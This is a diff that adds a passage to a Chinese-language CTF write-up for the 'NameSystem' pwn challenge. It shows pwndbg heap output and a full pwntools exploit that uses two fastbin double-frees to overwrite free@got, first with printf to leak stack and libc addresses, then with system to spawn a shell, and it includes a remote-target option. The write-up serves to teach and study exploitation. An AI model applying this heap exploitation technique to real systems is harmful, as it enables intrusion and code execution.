@@ -394,6 +394,120 @@ if __name__ == "__main__":
 
 ```
 
+打通后想起来自己很傻逼，搞得这么复杂，直接把`free@got`改为`printf`不就好了🐎，所以就又写了一份`exp`
+
+在攻击`free@got`之前，我先布置好了堆和指针数组的布局为
+
+```c
+pwndbg> bins
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x140e340 —▸ 0x140e300 —▸ 0x140e2c0 —▸ 0x140e280 —▸ 0x140e240 ◂— ...
+0x50: 0x0
+0x60: 0x140e540 —▸ 0x140e480 ◂— 0x140e540
+0x70: 0x140e6f0 —▸ 0x140e610 ◂— 0x140e6f0
+0x80: 0x0
+unsortedbin
+all: 0x0
+smallbins
+empty
+largebins
+empty
+pwndbg> telescope 0x6020a0 21
+00:0000│   0x6020a0 —▸ 0x140e390 ◂— 0x4242424242424242 ('BBBBBBBB')
+01:0008│   0x6020a8 —▸ 0x140e3d0 ◂— 0x4141414141414141 ('AAAAAAAA')
+02:0010│   0x6020b0 —▸ 0x140e430 ◂— 0x4141414141414141 ('AAAAAAAA')
+03:0018│   0x6020b8 —▸ 0x140e550 —▸ 0x140e480 ◂— 0x0
+04:0020│   0x6020c0 —▸ 0x140e5b0 ◂— 0x4141414141414141 ('AAAAAAAA')
+05:0028│   0x6020c8 —▸ 0x140e700 —▸ 0x140e610 ◂— 0x0
+06:0030│   0x6020d0 ◂— 0x0
+... ↓
+
+```
+
+两个`fastbindup`，第一个改`free@got`为`printf`,第二个改`free@got`为`system`
+
+exp为：
+
+```python
+from pwn import *
+
+context.arch='amd64'
+
+def cmd(command):
+	p.recvuntil("Your choice :")
+	p.sendline(str(command))
+def add(sz,name):
+	cmd(1)
+	p.recvuntil("Size:")
+	p.sendline(str(sz))
+	p.recvuntil("Name:")
+	p.send(name)
+
+def dele(idx):
+	cmd(3)
+	p.sendlineafter("to delete:",str(idx))
+
+def main(host,port=21605):
+	global p
+	if host:
+		p = remote(host,port)
+	else:
+		p = process("./NameSystem")
+	
+		# gdb.attach(p,"b *0x000000000400CB1")
+		# gdb.attach(p)
+	ptr_array = 0x0000000006020A0
+	for i in range(15):
+		add(0x30,"B"*0x30)
+	for i in range(5):
+		add(0x50,"A"*0x50)
+	dele(18)
+	dele(0)
+	dele(19)
+	dele(0)
+	dele(15)
+	dele(16)
+	for i in range(4):
+		add(0x60,"A"*0x60)
+	dele(18)
+	dele(0)
+	dele(19)
+	dele(0)
+	dele(15)
+	dele(16)
+	for i in range(10):
+		dele(0)
+	gdb.attach(p)	
+	
+	add(0x50,p64(0x601ffa)+'\n')
+	add(0x50,"A"*0x50)
+	add(0x50,"A"*0x50)
+	payload = "\x00"*0x6+p64(0x71)+p64(elf.plt["printf"])[:6]
+	add(0x50,payload+'\n')
+	
+	# idx --> 0xa
+	add(0x30,"%3$p=%13$p*\n")
+	dele(0xa)
+	stack = int(p.recvuntil('=',drop=True),16)
+	libc.address = int(p.recvuntil('*',drop=True),16)-0x20830
+	info("stack : " + hex(stack))
+	info("libc : " + hex(libc.address))
+	add(0x60,p64(0x602008)+'\n')
+	add(0x60,"/bin/sh\x00\n")
+	add(0x60,"A"*0x60)
+	add(0x60,p64(libc.symbols["system"])[:6]+'\n')
+	dele(0xb)
+	p.interactive()
+	
+if __name__ == "__main__":
+	elf = ELF("./NameSystem",checksec=False)
+	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
+	main(args['REMOTE'])
+
+```
+
 ## ezre
 
 走迷宫
